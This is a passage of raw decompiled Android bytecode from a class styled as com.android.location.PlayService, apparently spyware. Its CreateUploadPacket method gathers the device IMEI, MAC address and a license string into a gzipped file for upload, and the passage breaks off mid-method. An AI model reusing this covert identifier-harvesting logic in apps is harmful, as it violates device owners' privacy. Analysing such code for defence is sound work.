    //   538	544	6727	java/lang/Exception
    //   571	577	6727	java/lang/Exception
    //   604	612	6727	java/lang/Exception
    //   639	647	6727	java/lang/Exception
    //   677	686	6727	java/lang/Exception
    //   713	721	6727	java/lang/Exception
    //   750	759	6727	java/lang/Exception
    //   786	792	6727	java/lang/Exception
    //   819	825	6727	java/lang/Exception
    //   852	860	6727	java/lang/Exception
    //   887	895	6727	java/lang/Exception
    //   925	934	6727	java/lang/Exception
    //   961	969	6727	java/lang/Exception
    //   998	1007	6727	java/lang/Exception
    //   1034	1056	6727	java/lang/Exception
    //   1083	1103	6727	java/lang/Exception
    //   1130	1152	6727	java/lang/Exception
    //   1179	1188	6727	java/lang/Exception
    //   1215	1222	6727	java/lang/Exception
    //   1249	1255	6727	java/lang/Exception
    //   1285	1294	6727	java/lang/Exception
    //   1321	1330	6727	java/lang/Exception
    //   1359	1368	6727	java/lang/Exception
    //   1397	1406	6727	java/lang/Exception
    //   1432	1442	6727	java/lang/Exception
    //   1469	1476	6727	java/lang/Exception
    //   1506	1515	6727	java/lang/Exception
    //   1542	1552	6727	java/lang/Exception
    //   1581	1589	6727	java/lang/Exception
    //   1615	1625	6727	java/lang/Exception
    //   1652	1663	6727	java/lang/Exception
    //   1702	1711	6727	java/lang/Exception
    //   1738	1749	6727	java/lang/Exception
    //   1779	1787	6727	java/lang/Exception
    //   1814	1824	6727	java/lang/Exception
    //   1853	1862	6727	java/lang/Exception
    //   1891	1900	6727	java/lang/Exception
    //   1929	1938	6727	java/lang/Exception
    //   1967	1976	6727	java/lang/Exception
    //   2002	2024	6727	java/lang/Exception
    //   2050	2055	6727	java/lang/Exception
    //   2081	2088	6727	java/lang/Exception
    //   2122	2144	6727	java/lang/Exception
    //   2170	2174	6727	java/lang/Exception
    //   2200	2215	6727	java/lang/Exception
    //   2248	2257	6727	java/lang/Exception
    //   2283	2304	6727	java/lang/Exception
    //   2330	2335	6727	java/lang/Exception
    //   2367	2370	6727	java/lang/Exception
    //   2400	2409	6727	java/lang/Exception
    //   2439	2448	6727	java/lang/Exception
    //   2478	2487	6727	java/lang/Exception
    //   2514	2536	6727	java/lang/Exception
    //   2563	2568	6727	java/lang/Exception
    //   2595	2602	6727	java/lang/Exception
    //   2637	2659	6727	java/lang/Exception
    //   2686	2690	6727	java/lang/Exception
    //   2717	2730	6727	java/lang/Exception
    //   2764	2773	6727	java/lang/Exception
    //   2800	2821	6727	java/lang/Exception
    //   2848	2853	6727	java/lang/Exception
    //   2884	2887	6727	java/lang/Exception
    //   2916	2925	6727	java/lang/Exception
    //   2954	2963	6727	java/lang/Exception
    //   2992	3001	6727	java/lang/Exception
    //   3027	3049	6727	java/lang/Exception
    //   3075	3080	6727	java/lang/Exception
    //   3106	3113	6727	java/lang/Exception
    //   3147	3169	6727	java/lang/Exception
    //   3195	3199	6727	java/lang/Exception
    //   3225	3238	6727	java/lang/Exception
    //   3271	3280	6727	java/lang/Exception
    //   3306	3327	6727	java/lang/Exception
    //   3353	3358	6727	java/lang/Exception
    //   3390	3393	6727	java/lang/Exception
    //   3420	3462	6727	java/lang/Exception
    //   3489	3498	6727	java/lang/Exception
    //   3528	3541	6727	java/lang/Exception
    //   3571	3580	6727	java/lang/Exception
    //   3610	3619	6727	java/lang/Exception
    //   3649	3658	6727	java/lang/Exception
    //   3685	3707	6727	java/lang/Exception
    //   3734	3739	6727	java/lang/Exception
    //   3766	3773	6727	java/lang/Exception
    //   3808	3830	6727	java/lang/Exception
    //   3857	3861	6727	java/lang/Exception
    //   3888	3901	6727	java/lang/Exception
    //   3935	3944	6727	java/lang/Exception
    //   3971	3992	6727	java/lang/Exception
    //   4019	4024	6727	java/lang/Exception
    //   4055	4058	6727	java/lang/Exception
    //   4087	4096	6727	java/lang/Exception
    //   4125	4135	6727	java/lang/Exception
    //   4164	4173	6727	java/lang/Exception
    //   4199	4209	6727	java/lang/Exception
    //   4239	4248	6727	java/lang/Exception
    //   4278	4284	6727	java/lang/Exception
    //   4314	4324	6727	java/lang/Exception
    //   4351	4361	6727	java/lang/Exception
    //   4390	4399	6727	java/lang/Exception
    //   4428	4437	6727	java/lang/Exception
    //   4466	4475	6727	java/lang/Exception
    //   4501	4511	6727	java/lang/Exception
    //   4542	4551	6727	java/lang/Exception
    //   4582	4591	6727	java/lang/Exception
    //   4618	4629	6727	java/lang/Exception
    //   4659	4668	6727	java/lang/Exception
    //   4698	4707	6727	java/lang/Exception
    //   4734	4744	6727	java/lang/Exception
    //   4770	4776	6727	java/lang/Exception
    //   4802	4809	6727	java/lang/Exception
    //   4835	4840	6727	java/lang/Exception
    //   4866	4871	6727	java/lang/Exception
    //   4897	4906	6727	java/lang/Exception
    //   4937	4948	6727	java/lang/Exception
    //   4974	4995	6727	java/lang/Exception
    //   5027	5036	6727	java/lang/Exception
    //   5062	5071	6727	java/lang/Exception
    //   5097	5106	6727	java/lang/Exception
    //   5132	5139	6727	java/lang/Exception
    //   5165	5171	6727	java/lang/Exception
    //   5197	5206	6727	java/lang/Exception
    //   5242	5246	6727	java/lang/Exception
    //   5272	5279	6727	java/lang/Exception
    //   5305	5319	6727	java/lang/Exception
    //   5345	5352	6727	java/lang/Exception
    //   5378	5392	6727	java/lang/Exception
    //   5418	5427	6727	java/lang/Exception
    //   5453	5463	6727	java/lang/Exception
    //   5489	5498	6727	java/lang/Exception
    //   5524	5531	6727	java/lang/Exception
    //   5557	5591	6727	java/lang/Exception
    //   5617	5623	6727	java/lang/Exception
    //   5649	5657	6727	java/lang/Exception
    //   5683	5689	6727	java/lang/Exception
    //   5715	5724	6727	java/lang/Exception
    //   5750	5760	6727	java/lang/Exception
    //   5786	5795	6727	java/lang/Exception
    //   5821	5828	6727	java/lang/Exception
    //   5854	5876	6727	java/lang/Exception
    //   5902	5908	6727	java/lang/Exception
    //   5934	5942	6727	java/lang/Exception
    //   5972	5975	6727	java/lang/Exception
    //   6002	6007	6727	java/lang/Exception
    //   6034	6045	6727	java/lang/Exception
    //   6072	6096	6727	java/lang/Exception
    //   6123	6132	6727	java/lang/Exception
    //   6159	6173	6727	java/lang/Exception
    //   6200	6220	6727	java/lang/Exception
    //   6247	6255	6727	java/lang/Exception
    //   6282	6291	6727	java/lang/Exception
    //   6318	6331	6727	java/lang/Exception
    //   6358	6371	6727	java/lang/Exception
    //   6398	6418	6727	java/lang/Exception
    //   6445	6454	6727	java/lang/Exception
    //   6479	6485	6727	java/lang/Exception
    //   6510	6523	6727	java/lang/Exception
    //   6548	6554	6727	java/lang/Exception
    //   6579	6587	6727	java/lang/Exception
    //   6612	6619	6727	java/lang/Exception
    //   6714	6724	6727	java/lang/Exception
    //   6817	6821	6727	java/lang/Exception
    //   6851	6858	6727	java/lang/Exception
    //   6888	6898	6727	java/lang/Exception
    //   6961	6965	6727	java/lang/Exception
    //   6995	7002	6727	java/lang/Exception
    //   7032	7042	6727	java/lang/Exception
    //   7072	7107	6727	java/lang/Exception
    //   7146	7151	6727	java/lang/Exception
    //   7177	7199	6727	java/lang/Exception
    //   7231	7235	6727	java/lang/Exception
    //   7272	7277	6727	java/lang/Exception
    //   7304	7326	6727	java/lang/Exception
    //   7359	7363	6727	java/lang/Exception
    //   7399	7404	6727	java/lang/Exception
    //   7430	7452	6727	java/lang/Exception
    //   7484	7488	6727	java/lang/Exception
    //   7525	7530	6727	java/lang/Exception
    //   7557	7579	6727	java/lang/Exception
    //   7612	7616	6727	java/lang/Exception
    //   7645	7669	6727	java/lang/Exception
    //   7695	7705	6727	java/lang/Exception
    //   7740	7746	6727	java/lang/Exception
    //   7775	7796	6727	java/lang/Exception
    //   7822	7836	6727	java/lang/Exception
    //   7862	7883	6727	java/lang/Exception
    //   8292	8300	6727	java/lang/Exception
    //   8327	8334	6727	java/lang/Exception
    //   8390	8396	6727	java/lang/Exception
    //   8425	8445	6727	java/lang/Exception
    //   8595	8617	6727	java/lang/Exception
    //   8703	8711	6727	java/lang/Exception
    //   8737	8742	6727	java/lang/Exception
    //   8771	8791	6727	java/lang/Exception
    //   8960	8982	6727	java/lang/Exception
    //   9071	9079	6727	java/lang/Exception
    //   9105	9110	6727	java/lang/Exception
    //   9139	9159	6727	java/lang/Exception
    //   9192	9198	6727	java/lang/Exception
    //   6774	6779	6784	java/io/IOException
    //   70	82	6901	finally
    //   109	122	6901	finally
    //   149	155	6901	finally
    //   182	191	6901	finally
    //   218	231	6901	finally
    //   258	264	6901	finally
    //   291	300	6901	finally
    //   327	333	6901	finally
    //   360	366	6901	finally
    //   393	401	6901	finally
    //   428	435	6901	finally
    //   462	470	6901	finally
    //   497	511	6901	finally
    //   538	544	6901	finally
    //   571	577	6901	finally
    //   604	612	6901	finally
    //   639	647	6901	finally
    //   677	686	6901	finally
    //   713	721	6901	finally
    //   750	759	6901	finally
    //   786	792	6901	finally
    //   819	825	6901	finally
    //   852	860	6901	finally
    //   887	895	6901	finally
    //   925	934	6901	finally
    //   961	969	6901	finally
    //   998	1007	6901	finally
    //   1034	1056	6901	finally
    //   1083	1103	6901	finally
    //   1130	1152	6901	finally
    //   1179	1188	6901	finally
    //   1215	1222	6901	finally
    //   1249	1255	6901	finally
    //   1285	1294	6901	finally
    //   1321	1330	6901	finally
    //   1359	1368	6901	finally
    //   1397	1406	6901	finally
    //   1432	1442	6901	finally
    //   1469	1476	6901	finally
    //   1506	1515	6901	finally
    //   1542	1552	6901	finally
    //   1581	1589	6901	finally
    //   1615	1625	6901	finally
    //   1652	1663	6901	finally
    //   1702	1711	6901	finally
    //   1738	1749	6901	finally
    //   1779	1787	6901	finally
    //   1814	1824	6901	finally
    //   1853	1862	6901	finally
    //   1891	1900	6901	finally
    //   1929	1938	6901	finally
    //   1967	1976	6901	finally
    //   2002	2024	6901	finally
    //   2050	2055	6901	finally
    //   2081	2088	6901	finally
    //   2122	2144	6901	finally
    //   2170	2174	6901	finally
    //   2200	2215	6901	finally
    //   2248	2257	6901	finally
    //   2283	2304	6901	finally
    //   2330	2335	6901	finally
    //   2367	2370	6901	finally
    //   2400	2409	6901	finally
    //   2439	2448	6901	finally
    //   2478	2487	6901	finally
    //   2514	2536	6901	finally
    //   2563	2568	6901	finally
    //   2595	2602	6901	finally
    //   2637	2659	6901	finally
    //   2686	2690	6901	finally
    //   2717	2730	6901	finally
    //   2764	2773	6901	finally
    //   2800	2821	6901	finally
    //   2848	2853	6901	finally
    //   2884	2887	6901	finally
    //   2916	2925	6901	finally
    //   2954	2963	6901	finally
    //   2992	3001	6901	finally
    //   3027	3049	6901	finally
    //   3075	3080	6901	finally
    //   3106	3113	6901	finally
    //   3147	3169	6901	finally
    //   3195	3199	6901	finally
    //   3225	3238	6901	finally
    //   3271	3280	6901	finally
    //   3306	3327	6901	finally
    //   3353	3358	6901	finally
    //   3390	3393	6901	finally
    //   3420	3462	6901	finally
    //   3489	3498	6901	finally
    //   3528	3541	6901	finally
    //   3571	3580	6901	finally
    //   3610	3619	6901	finally
    //   3649	3658	6901	finally
    //   3685	3707	6901	finally
    //   3734	3739	6901	finally
    //   3766	3773	6901	finally
    //   3808	3830	6901	finally
    //   3857	3861	6901	finally
    //   3888	3901	6901	finally
    //   3935	3944	6901	finally
    //   3971	3992	6901	finally
    //   4019	4024	6901	finally
    //   4055	4058	6901	finally
    //   4087	4096	6901	finally
    //   4125	4135	6901	finally
    //   4164	4173	6901	finally
    //   4199	4209	6901	finally
    //   4239	4248	6901	finally
    //   4278	4284	6901	finally
    //   4314	4324	6901	finally
    //   4351	4361	6901	finally
    //   4390	4399	6901	finally
    //   4428	4437	6901	finally
    //   4466	4475	6901	finally
    //   4501	4511	6901	finally
    //   4542	4551	6901	finally
    //   4582	4591	6901	finally
    //   4618	4629	6901	finally
    //   4659	4668	6901	finally
    //   4698	4707	6901	finally
    //   4734	4744	6901	finally
    //   4770	4776	6901	finally
    //   4802	4809	6901	finally
    //   4835	4840	6901	finally
    //   4866	4871	6901	finally
    //   4897	4906	6901	finally
    //   4937	4948	6901	finally
    //   4974	4995	6901	finally
    //   5027	5036	6901	finally
    //   5062	5071	6901	finally
    //   5097	5106	6901	finally
    //   5132	5139	6901	finally
    //   5165	5171	6901	finally
    //   5197	5206	6901	finally
    //   5242	5246	6901	finally
    //   5272	5279	6901	finally
    //   5305	5319	6901	finally
    //   5345	5352	6901	finally
    //   5378	5392	6901	finally
    //   5418	5427	6901	finally
    //   5453	5463	6901	finally
    //   5489	5498	6901	finally
    //   5524	5531	6901	finally
    //   5557	5591	6901	finally
    //   5617	5623	6901	finally
    //   5649	5657	6901	finally
    //   5683	5689	6901	finally
    //   5715	5724	6901	finally
    //   5750	5760	6901	finally
    //   5786	5795	6901	finally
    //   5821	5828	6901	finally
    //   5854	5876	6901	finally
    //   5902	5908	6901	finally
    //   5934	5942	6901	finally
    //   5972	5975	6901	finally
    //   6002	6007	6901	finally
    //   6034	6045	6901	finally
    //   6072	6096	6901	finally
    //   6123	6132	6901	finally
    //   6159	6173	6901	finally
    //   6200	6220	6901	finally
    //   6247	6255	6901	finally
    //   6282	6291	6901	finally
    //   6318	6331	6901	finally
    //   6358	6371	6901	finally
    //   6398	6418	6901	finally
    //   6445	6454	6901	finally
    //   6479	6485	6901	finally
    //   6510	6523	6901	finally
    //   6548	6554	6901	finally
    //   6579	6587	6901	finally
    //   6612	6619	6901	finally
    //   6714	6724	6901	finally
    //   6740	6747	6901	finally
    //   6817	6821	6901	finally
    //   6851	6858	6901	finally
    //   6888	6898	6901	finally
    //   6961	6965	6901	finally
    //   6995	7002	6901	finally
    //   7032	7042	6901	finally
    //   7072	7107	6901	finally
    //   7146	7151	6901	finally
    //   7177	7199	6901	finally
    //   7231	7235	6901	finally
    //   7272	7277	6901	finally
    //   7304	7326	6901	finally
    //   7359	7363	6901	finally
    //   7399	7404	6901	finally
    //   7430	7452	6901	finally
    //   7484	7488	6901	finally
    //   7525	7530	6901	finally
    //   7557	7579	6901	finally
    //   7612	7616	6901	finally
    //   7645	7669	6901	finally
    //   7695	7705	6901	finally
    //   7740	7746	6901	finally
    //   7775	7796	6901	finally
    //   7822	7836	6901	finally
    //   7862	7883	6901	finally
    //   7903	7930	6901	finally
    //   7945	7953	6901	finally
    //   7968	7994	6901	finally
    //   8009	8030	6901	finally
    //   8045	8052	6901	finally
    //   8067	8073	6901	finally
    //   8090	8110	6901	finally
    //   8125	8134	6901	finally
    //   8153	8159	6901	finally
    //   8178	8198	6901	finally
    //   8216	8237	6901	finally
    //   8252	8260	6901	finally
    //   8292	8300	6901	finally
    //   8327	8334	6901	finally
    //   8355	8361	6901	finally
    //   8390	8396	6901	finally
    //   8425	8445	6901	finally
    //   8460	8466	6901	finally
    //   8478	8484	6901	finally
    //   8496	8500	6901	finally
    //   8512	8520	6901	finally
    //   8532	8545	6901	finally
    //   8561	8565	6901	finally
    //   8595	8617	6901	finally
    //   8632	8638	6901	finally
    //   8650	8654	6901	finally
    //   8666	8672	6901	finally
    //   8703	8711	6901	finally
    //   8737	8742	6901	finally
    //   8771	8791	6901	finally
    //   8806	8812	6901	finally
    //   8824	8849	6901	finally
    //   8861	8865	6901	finally
    //   8877	8885	6901	finally
    //   8897	8910	6901	finally
    //   8926	8930	6901	finally
    //   8960	8982	6901	finally
    //   9000	9006	6901	finally
    //   9018	9024	6901	finally
    //   9036	9040	6901	finally
    //   9071	9079	6901	finally
    //   9105	9110	6901	finally
    //   9139	9159	6901	finally
    //   9192	9198	6901	finally
    //   7903	7930	8263	java/lang/Exception
    //   7945	7953	8263	java/lang/Exception
    //   7968	7994	8263	java/lang/Exception
    //   8009	8030	8263	java/lang/Exception
    //   8045	8052	8263	java/lang/Exception
    //   8067	8073	8263	java/lang/Exception
    //   8090	8110	8263	java/lang/Exception
    //   8125	8134	8263	java/lang/Exception
    //   8153	8159	8263	java/lang/Exception
    //   8178	8198	8263	java/lang/Exception
    //   8216	8237	8263	java/lang/Exception
    //   8252	8260	8263	java/lang/Exception
    //   8355	8361	8263	java/lang/Exception
    //   8460	8466	8675	java/lang/Exception
    //   8478	8484	8675	java/lang/Exception
    //   8496	8500	8675	java/lang/Exception
    //   8512	8520	8675	java/lang/Exception
    //   8532	8545	8675	java/lang/Exception
    //   8561	8565	8675	java/lang/Exception
    //   8632	8638	8675	java/lang/Exception
    //   8650	8654	8675	java/lang/Exception
    //   8666	8672	8675	java/lang/Exception
    //   8806	8812	9043	java/lang/Exception
    //   8824	8849	9043	java/lang/Exception
    //   8861	8865	9043	java/lang/Exception
    //   8877	8885	9043	java/lang/Exception
    //   8897	8910	9043	java/lang/Exception
    //   8926	8930	9043	java/lang/Exception
    //   9000	9006	9043	java/lang/Exception
    //   9018	9024	9043	java/lang/Exception
    //   9036	9040	9043	java/lang/Exception
    //   6752	6757	9201	java/io/IOException
    //   6762	6767	9205	java/io/IOException
    //   6907	6912	9209	java/io/IOException
    //   6917	6922	9214	java/io/IOException
    //   6927	6932	9219	java/io/IOException
    //   6624	6629	9224	java/io/IOException
    //   6633	6637	9229	java/io/IOException
    //   6645	6650	9233	java/io/IOException
  }
  
  /* Error */
  public int CreateUploadPacket(String paramString)
  {
    // Byte code:
    //   0: aload_1
    //   1: ifnull +9 -> 10
    //   4: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   7: ifnonnull +7 -> 14
    //   10: iconst_0
    //   11: istore_2
    //   12: iload_2
    //   13: ireturn
    //   14: ldc_w 3710
    //   17: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   20: bipush 32
    //   22: newarray byte
    //   24: astore 22
    //   26: iconst_0
    //   27: istore_2
    //   28: iload_2
    //   29: aload 22
    //   31: arraylength
    //   32: if_icmplt +3921 -> 3953
    //   35: iconst_5
    //   36: istore_3
    //   37: aconst_null
    //   38: astore 11
    //   40: aconst_null
    //   41: astore 7
    //   43: aconst_null
    //   44: astore 12
    //   46: aconst_null
    //   47: astore 17
    //   49: aconst_null
    //   50: astore 19
    //   52: aconst_null
    //   53: astore 16
    //   55: aconst_null
    //   56: astore 20
    //   58: aconst_null
    //   59: astore 15
    //   61: aconst_null
    //   62: astore 18
    //   64: aconst_null
    //   65: astore 14
    //   67: aconst_null
    //   68: astore 21
    //   70: aconst_null
    //   71: astore 13
    //   73: aload 20
    //   75: astore 10
    //   77: aload 21
    //   79: astore 9
    //   81: aload 12
    //   83: astore 8
    //   85: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   88: ldc_w 360
    //   91: iconst_0
    //   92: invokevirtual 1723	android/content/Context:openFileOutput	(Ljava/lang/String;I)Ljava/io/FileOutputStream;
    //   95: astore 6
    //   97: aload 20
    //   99: astore 10
    //   101: aload 6
    //   103: astore 7
    //   105: aload 21
    //   107: astore 9
    //   109: aload 12
    //   111: astore 8
    //   113: aload 6
    //   115: astore 11
    //   117: iconst_4
    //   118: invokestatic 3474	java/nio/ByteBuffer:allocate	(I)Ljava/nio/ByteBuffer;
    //   121: iconst_0
    //   122: invokevirtual 3476	java/nio/ByteBuffer:putInt	(I)Ljava/nio/ByteBuffer;
    //   125: invokevirtual 3479	java/nio/ByteBuffer:array	()[B
    //   128: astore 23
    //   130: aload 20
    //   132: astore 10
    //   134: aload 6
    //   136: astore 7
    //   138: aload 21
    //   140: astore 9
    //   142: aload 12
    //   144: astore 8
    //   146: aload 6
    //   148: astore 11
    //   150: aload_0
    //   151: aload 23
    //   153: invokevirtual 3482	com/android/location/PlayService:Reverse4	([B)V
    //   156: aload 20
    //   158: astore 10
    //   160: aload 6
    //   162: astore 7
    //   164: aload 21
    //   166: astore 9
    //   168: aload 12
    //   170: astore 8
    //   172: aload 6
    //   174: astore 11
    //   176: aload 6
    //   178: aload 23
    //   180: iconst_0
    //   181: iconst_4
    //   182: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   185: aload 20
    //   187: astore 10
    //   189: aload 6
    //   191: astore 7
    //   193: aload 21
    //   195: astore 9
    //   197: aload 12
    //   199: astore 8
    //   201: aload 6
    //   203: astore 11
    //   205: iconst_4
    //   206: invokestatic 3474	java/nio/ByteBuffer:allocate	(I)Ljava/nio/ByteBuffer;
    //   209: iconst_1
    //   210: invokevirtual 3476	java/nio/ByteBuffer:putInt	(I)Ljava/nio/ByteBuffer;
    //   213: invokevirtual 3479	java/nio/ByteBuffer:array	()[B
    //   216: astore 23
    //   218: aload 20
    //   220: astore 10
    //   222: aload 6
    //   224: astore 7
    //   226: aload 21
    //   228: astore 9
    //   230: aload 12
    //   232: astore 8
    //   234: aload 6
    //   236: astore 11
    //   238: aload_0
    //   239: aload 23
    //   241: invokevirtual 3482	com/android/location/PlayService:Reverse4	([B)V
    //   244: aload 20
    //   246: astore 10
    //   248: aload 6
    //   250: astore 7
    //   252: aload 21
    //   254: astore 9
    //   256: aload 12
    //   258: astore 8
    //   260: aload 6
    //   262: astore 11
    //   264: aload 6
    //   266: aload 23
    //   268: iconst_0
    //   269: iconst_4
    //   270: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   273: aload 20
    //   275: astore 10
    //   277: aload 6
    //   279: astore 7
    //   281: aload 21
    //   283: astore 9
    //   285: aload 12
    //   287: astore 8
    //   289: aload 6
    //   291: astore 11
    //   293: new 2291	java/util/zip/GZIPOutputStream
    //   296: dup
    //   297: aload 6
    //   299: invokespecial 3711	java/util/zip/GZIPOutputStream:<init>	(Ljava/io/OutputStream;)V
    //   302: astore 12
    //   304: aload 15
    //   306: astore 8
    //   308: aload 13
    //   310: astore 10
    //   312: aload 16
    //   314: astore 7
    //   316: aload 14
    //   318: astore 9
    //   320: aconst_null
    //   321: checkcast 2701	[B
    //   324: astore 11
    //   326: aload 15
    //   328: astore 8
    //   330: aload 13
    //   332: astore 10
    //   334: aload 16
    //   336: astore 7
    //   338: aload 14
    //   340: astore 9
    //   342: getstatic 839	com/android/location/PlayService:sLicense	Ljava/lang/String;
    //   345: ifnull +3620 -> 3965
    //   348: aload 15
    //   350: astore 8
    //   352: aload 13
    //   354: astore 10
    //   356: aload 16
    //   358: astore 7
    //   360: aload 14
    //   362: astore 9
    //   364: getstatic 839	com/android/location/PlayService:sLicense	Ljava/lang/String;
    //   367: invokevirtual 1337	java/lang/String:getBytes	()[B
    //   370: astore 11
    //   372: aload 15
    //   374: astore 8
    //   376: aload 13
    //   378: astore 10
    //   380: aload 16
    //   382: astore 7
    //   384: aload 14
    //   386: astore 9
    //   388: aload 12
    //   390: aload 11
    //   392: invokevirtual 3712	java/util/zip/GZIPOutputStream:write	([B)V
    //   395: aload 15
    //   397: astore 8
    //   399: aload 13
    //   401: astore 10
    //   403: aload 16
    //   405: astore 7
    //   407: aload 14
    //   409: astore 9
    //   411: aload 11
    //   413: arraylength
    //   414: bipush 16
    //   416: if_icmpge +33 -> 449
    //   419: aload 15
    //   421: astore 8
    //   423: aload 13
    //   425: astore 10
    //   427: aload 16
    //   429: astore 7
    //   431: aload 14
    //   433: astore 9
    //   435: aload 12
    //   437: aload 22
    //   439: iconst_0
    //   440: bipush 16
    //   442: aload 11
    //   444: arraylength
    //   445: isub
    //   446: invokevirtual 3713	java/util/zip/GZIPOutputStream:write	([BII)V
    //   449: aload 15
    //   451: astore 8
    //   453: aload 13
    //   455: astore 10
    //   457: aload 16
    //   459: astore 7
    //   461: aload 14
    //   463: astore 9
    //   465: new 864	java/lang/StringBuilder
    //   468: dup
    //   469: ldc_w 3715
    //   472: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   475: getstatic 847	com/android/location/PlayService:sMAC	Ljava/lang/String;
    //   478: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   481: ldc_w 3717
    //   484: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   487: getstatic 845	com/android/location/PlayService:sIMEI	Ljava/lang/String;
    //   490: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   493: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   496: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   499: aload 15
    //   501: astore 8
    //   503: aload 13
    //   505: astore 10
    //   507: aload 16
    //   509: astore 7
    //   511: aload 14
    //   513: astore 9
    //   515: aconst_null
    //   516: checkcast 2701	[B
    //   519: astore 11
    //   521: aload 15
    //   523: astore 8
    //   525: aload 13
    //   527: astore 10
    //   529: aload 16
    //   531: astore 7
    //   533: aload 14
    //   535: astore 9
    //   537: getstatic 845	com/android/location/PlayService:sIMEI	Ljava/lang/String;
    //   540: ifnull +3588 -> 4128
    //   543: aload 15
    //   545: astore 8
    //   547: aload 13
    //   549: astore 10
    //   551: aload 16
    //   553: astore 7
    //   555: aload 14
    //   557: astore 9
    //   559: getstatic 845	com/android/location/PlayService:sIMEI	Ljava/lang/String;
    //   562: invokevirtual 1337	java/lang/String:getBytes	()[B
    //   565: astore 11
    //   567: aload 15
    //   569: astore 8
    //   571: aload 13
    //   573: astore 10
    //   575: aload 16
    //   577: astore 7
    //   579: aload 14
    //   581: astore 9
    //   583: aload 11
    //   585: arraylength
    //   586: bipush 15
    //   588: if_icmple +3491 -> 4079
    //   591: bipush 15
    //   593: istore_2
    //   594: aload 15
    //   596: astore 8
    //   598: aload 13
    //   600: astore 10
    //   602: aload 16
    //   604: astore 7
    //   606: aload 14
    //   608: astore 9
    //   610: aload 12
    //   612: aload 11
    //   614: iconst_0
    //   615: iload_2
    //   616: invokevirtual 3713	java/util/zip/GZIPOutputStream:write	([BII)V
    //   619: aload 15
    //   621: astore 8
    //   623: aload 13
    //   625: astore 10
    //   627: aload 16
    //   629: astore 7
    //   631: aload 14
    //   633: astore 9
    //   635: aload 11
    //   637: arraylength
    //   638: bipush 15
    //   640: if_icmple +3462 -> 4102
    //   643: iconst_0
    //   644: istore_2
    //   645: aload 15
    //   647: astore 8
    //   649: aload 13
    //   651: astore 10
    //   653: aload 16
    //   655: astore 7
    //   657: aload 14
    //   659: astore 9
    //   661: aload 12
    //   663: aload 22
    //   665: iconst_0
    //   666: iload_2
    //   667: invokevirtual 3713	java/util/zip/GZIPOutputStream:write	([BII)V
    //   670: aload 15
    //   672: astore 8
    //   674: aload 13
    //   676: astore 10
    //   678: aload 16
    //   680: astore 7
    //   682: aload 14
    //   684: astore 9
    //   686: new 864	java/lang/StringBuilder
    //   689: dup
    //   690: ldc_w 3719
    //   693: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   696: aload 11
    //   698: arraylength
    //   699: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   702: ldc_w 1262
    //   705: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   708: getstatic 845	com/android/location/PlayService:sIMEI	Ljava/lang/String;
    //   711: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   714: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   717: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   720: aload 15
    //   722: astore 8
    //   724: aload 13
    //   726: astore 10
    //   728: aload 16
    //   730: astore 7
    //   732: aload 14
    //   734: astore 9
    //   736: aconst_null
    //   737: checkcast 2701	[B
    //   740: astore 11
    //   742: aload 15
    //   744: astore 8
    //   746: aload 13
    //   748: astore 10
    //   750: aload 16
    //   752: astore 7
    //   754: aload 14
    //   756: astore 9
    //   758: getstatic 847	com/android/location/PlayService:sMAC	Ljava/lang/String;
    //   761: ifnull +3496 -> 4257
    //   764: aload 15
    //   766: astore 8
    //   768: aload 13
    //   770: astore 10
    //   772: aload 16
    //   774: astore 7
    //   776: aload 14
    //   778: astore 9
    //   780: getstatic 847	com/android/location/PlayService:sMAC	Ljava/lang/String;
    //   783: invokevirtual 1337	java/lang/String:getBytes	()[B
    //   786: astore 11
    //   788: aload 15
    //   790: astore 8
    //   792: aload 13
    //   794: astore 10
    //   796: aload 16
    //   798: astore 7
    //   800: aload 14
    //   802: astore 9
    //   804: aload 11
    //   806: arraylength
    //   807: bipush 17
    //   809: if_icmple +3399 -> 4208
    //   812: bipush 17
    //   814: istore_2
    //   815: aload 15
    //   817: astore 8
    //   819: aload 13
    //   821: astore 10
    //   823: aload 16
    //   825: astore 7
    //   827: aload 14
    //   829: astore 9
    //   831: aload 12
    //   833: aload 11
    //   835: iconst_0
    //   836: iload_2
    //   837: invokevirtual 3713	java/util/zip/GZIPOutputStream:write	([BII)V
    //   840: aload 15
    //   842: astore 8
    //   844: aload 13
    //   846: astore 10
    //   848: aload 16
    //   850: astore 7
    //   852: aload 14
    //   854: astore 9
    //   856: aload 11
    //   858: arraylength
    //   859: bipush 17
    //   861: if_icmple +3370 -> 4231
    //   864: iconst_0
    //   865: istore_2
    //   866: aload 15
    //   868: astore 8
    //   870: aload 13
    //   872: astore 10
    //   874: aload 16
    //   876: astore 7
    //   878: aload 14
    //   880: astore 9
    //   882: aload 12
    //   884: aload 22
    //   886: iconst_0
    //   887: iload_2
    //   888: invokevirtual 3713	java/util/zip/GZIPOutputStream:write	([BII)V
    //   891: aload 15
    //   893: astore 8
    //   895: aload 13
    //   897: astore 10
    //   899: aload 16
    //   901: astore 7
    //   903: aload 14
    //   905: astore 9
    //   907: new 864	java/lang/StringBuilder
    //   910: dup
    //   911: ldc_w 3721
    //   914: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   917: aload 11
    //   919: arraylength
    //   920: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   923: ldc_w 1262
